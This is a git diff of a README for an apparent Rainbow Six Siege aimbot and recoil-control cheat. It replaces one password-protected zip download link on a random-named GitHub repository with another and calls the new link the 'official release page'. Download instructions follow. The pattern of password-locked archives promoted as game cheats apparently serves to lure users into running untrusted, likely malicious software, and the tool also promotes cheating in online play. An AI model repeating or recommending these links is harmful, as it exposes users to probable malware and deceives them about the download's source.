@@ -1,6 +1,6 @@
 # 🎯 R6-Recoil-Control-Aim-bot-Assist-Research-2026- - Improve your aim with precision software
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip) *PASSWORD AK2026*
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip) *PASSWORD AK2026*
 
 ## 📌 About this project
 
@@ -33,7 +33,7 @@ Ensure your computer meets these requirements to run the software:
 
 Follow these steps to obtain and prepare the software:
 
-1.  Visit the official release page: [https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+1.  Visit the official release page: [https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 2.  Locate the latest release at the top of the list.
 3.  Click the zip file link to download the package to your computer.
 4.  Open your Downloads folder.
